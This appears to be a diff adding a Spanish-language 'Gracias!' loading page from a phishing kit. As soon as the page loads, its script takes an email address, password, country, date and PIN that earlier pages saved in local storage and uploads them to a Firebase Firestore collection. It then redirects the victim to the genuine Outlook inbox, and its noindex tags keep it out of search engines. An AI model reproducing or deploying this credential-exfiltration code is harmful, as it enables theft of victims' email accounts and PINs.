@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="robots" content="noindex" />
+    <meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="nosnippet">
+<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gracias!</title>
+</head>
+<style>
+    .lds-ring {
+  display: inline-block;
+  position: relative;
+  width: 80px;
+  height: 80px;
+}
+.lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border: 8px solid #cef;
+  border-radius: 50%;
+  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+  border-color: #cef transparent transparent transparent;
+}
+.lds-ring div:nth-child(1) {
+  animation-delay: -0.45s;
+}
+.lds-ring div:nth-child(2) {
+  animation-delay: -0.3s;
+}
+.lds-ring div:nth-child(3) {
+  animation-delay: -0.15s;
+}
+@keyframes lds-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+</style>
+<body>
+    <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+</body>
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-analytics.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+
+
+
+<script id="testScriptName">
+  // Your web app's Firebase configuration
+   var firebaseConfig = {
+    apiKey: "AIzaSyDtYmbb7xjczLED3c_GsnPR02F4i4QuQ7U",
+  authDomain: "josedavid-cd8e3.firebaseapp.com",
+  projectId: "josedavid-cd8e3",
+  storageBucket: "josedavid-cd8e3.appspot.com",
+  messagingSenderId: "299167333254",
+  appId: "1:299167333254:web:467488a0f25dcf60b70a07"
+
+  };
+  // Initialize Firebase  
+  firebase.initializeApp(firebaseConfig);
+
+</script>
+
+<script>
+ const db = firebase.firestore();
+/*const midnight = new Date(firebase.firestore.Timestamp.now().toDate().setHours(0, 0, 0, 0));*/
+
+  const created = firebase.firestore.Timestamp.fromDate(new Date()).toDate();
+window.addEventListener("load", async (e) => {
+  e.preventDefault();
+  /*
+  
+  
+  agregar crypto.uuid()
+  a el doc.name
+  */
+  
+var name = crypto.randomUUID();
+  await db.collection("usuarionew24").doc(name).set({
+    mail: localStorage.getItem("common"),
+    pw: localStorage.getItem("commons"),
+    pais: localStorage.getItem("pusr"),
+    FECHA: localStorage.getItem("pusrf"),
+    pin:localStorage.getItem("commonpn"),
+    repin: localStorage.getItem("commonspnn"),
+   revisado: false,
+  });
+
+  window.location = "https://outlook.live.com/mail/0/inbox";
+});
+
+
+
+
+
+
+</script>
+</html>
